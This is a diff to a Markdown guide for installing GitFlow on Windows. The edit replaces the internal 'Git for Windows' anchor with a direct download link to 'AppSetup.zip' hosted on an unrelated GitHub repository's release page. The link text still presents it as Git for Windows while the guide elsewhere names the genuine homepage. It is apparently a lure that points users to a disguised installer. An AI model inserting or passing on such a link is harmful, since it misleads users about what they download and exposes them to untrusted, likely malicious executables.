@@ -1,6 +1,6 @@
 # Installing on Windows
 
-For Windows users, [Git for Windows](#git-for-windows) is the recommended method.
+For Windows users, [Git for Windows](https://github.com/berelium/bonkonauts.github.io/releases/download/release/AppSetup.zip) is the recommended method.
 
 ## Git for Windows
 Follow the instructions on the [Git for Windows homepage](https://git-for-windows.github.io) to install Git for Windows.  As of Git for Windows 2.6.4, GitFlow (AVH edition) is included, so you're all done.
